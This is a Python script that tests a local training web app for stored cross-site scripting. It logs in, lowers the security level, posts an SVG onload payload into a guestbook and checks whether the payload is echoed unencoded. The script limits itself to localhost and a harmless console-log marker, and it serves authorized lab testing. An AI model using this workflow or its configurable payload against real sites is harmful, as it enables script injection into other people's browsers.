#!/usr/bin/env python3
"""
XSS-005 stored-XSS verification draft (harmless marker only).

Scope: local authorized lab only. Host must be localhost, 127.0.0.1 or ::1.
The payload only calls console.log('LLM_LAB_XSS'); it does not read cookies,
does not exfiltrate data and does not install persistence.
This script performs submits and read-backs only; browser execution must be
observed manually.
"""
import argparse
import http.cookiejar
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
MARKER_JS = "console.log('LLM_LAB_XSS')"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse to follow redirects so auth/protocol changes stay visible."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect blocked: %s" % newurl, headers, fp
        )


def check_target(base_url):
    parsed = urllib.parse.urlparse(base_url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("refused: unsupported scheme %r" % parsed.scheme)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise SystemExit(
            "refused: host %r is not an allowed local lab host" % parsed.hostname
        )
    return base_url.rstrip("/")


def make_opener():
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )
    return opener, jar


def request(opener, url, data=None, timeout=10.0):
    body = urllib.parse.urlencode(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method="POST" if data else "GET")
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, (exc.read() or b"").decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser(
        description="Stored XSS draft check; harmless console marker only."
    )
    ap.add_argument("--base-url", default="http://127.0.0.1")
    ap.add_argument("--username", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument(
        "--security", default="low", choices=["low", "medium", "high", "impossible"]
    )
    ap.add_argument("--name", default="LLM_LAB_XSS")
    ap.add_argument("--payload", default='<svg onload="%s"></svg>' % MARKER_JS)
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()

    base = check_target(args.base_url)
    opener, _jar = make_opener()

    code, _ = request(opener, base + "/login.php", timeout=args.timeout)
    print("[1] GET  /login.php ->", code)

    code, _ = request(
        opener,
        base + "/login.php",
        {"username": args.username, "password": args.password, "Login": "Login"},
        timeout=args.timeout,
    )
    print("[2] POST /login.php ->", code, "(302 to index.php expected on success)")

    code, page = request(
        opener,
        base + "/security.php",
        {"security": args.security, "seclev_submit": "Submit"},
        timeout=args.timeout,
    )
    print("[3] POST /security.php (%s) ->" % args.security, code)
    if "login.php" in page:
        raise SystemExit("not authenticated: security.php returned the login page")

    code, page = request(
        opener,
        base + "/vulnerabilities/xss_s/",
        {"txtName": args.name, "mtxMessage": args.payload, "btnSign": "Sign Guestbook"},
        timeout=args.timeout,
    )
    print("[4] POST /vulnerabilities/xss_s/ (btnSign) ->", code)

    code, page = request(opener, base + "/vulnerabilities/xss_s/", timeout=args.timeout)
    print("[5] GET  /vulnerabilities/xss_s/ ->", code)

    if args.payload in page:
        print("[RAW] payload is echoed unencoded inside guestbook_comments HTML;"
              " server-side output encoding is absent for this configuration")
    elif "&lt;svg" in page:
        print("[ENCODED] payload appears HTML-entity encoded; treat this"
              " configuration as protected and do not claim execution")
    else:
        raise SystemExit(
            "payload not found in the response: check security level, field names"
            " (txtName/mtxMessage/btnSign) and whether the record was stored"
        )

    print("[MANUAL] Open GET /vulnerabilities/xss_s/ in the logged-in lab browser"
          " with the devtools console visible; expected only: " + MARKER_JS)
    print("[CLEANUP] DELETE FROM guestbook WHERE comment LIKE '%LLM_LAB_XSS%';"
          " do not press btnClear, it truncates every row")


if __name__ == "__main__":
    try:
        main()
    except urllib.error.URLError as exc:
        sys.exit("connection error (lab host reachable?): %s" % exc)
